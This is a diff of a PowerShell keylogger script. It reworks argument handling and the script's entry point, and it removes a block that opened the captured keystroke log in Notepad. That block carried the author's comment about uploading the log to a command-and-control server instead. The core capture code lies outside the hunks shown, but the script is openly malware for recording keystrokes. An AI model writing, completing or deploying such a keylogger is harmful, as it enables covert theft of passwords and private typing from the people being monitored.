@@ -1,3 +1,4 @@
+$file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }
 function title {
     Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
     Write-Host "
@@ -11,14 +12,13 @@ function title {
     " -ForegroundColor Blue
     Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
     Write-Host ""
- }
+}
 
 
 #requires -Version 2
-function Start-KeyLogger($name) {
+function Start-KeyLogger {
 
     begin {
-        $file_name = If ($name) { $name }else { Read-Host "Enter the file name  to save the keylogs captured" }
         $path = "$(Get-Location)\$file_name"
 
         # Signatures for API Calls
@@ -77,16 +77,16 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
         }
     }
-    end {
-        # open logger file in Notepad
-        #will want instead to upload the file to my c2
-        notepad $path
+}
+
+function run{
+    
+    title
+    try{
+        Start-KeyLogger
+    }catch{
+        Write-Host "Error while trying to start keylogging..." -ForegroundColor Red
     }
 }
 
-function run($name) {
-    title
-    Start-KeyLogger($name)
-}
-
-run($args[0])
+run
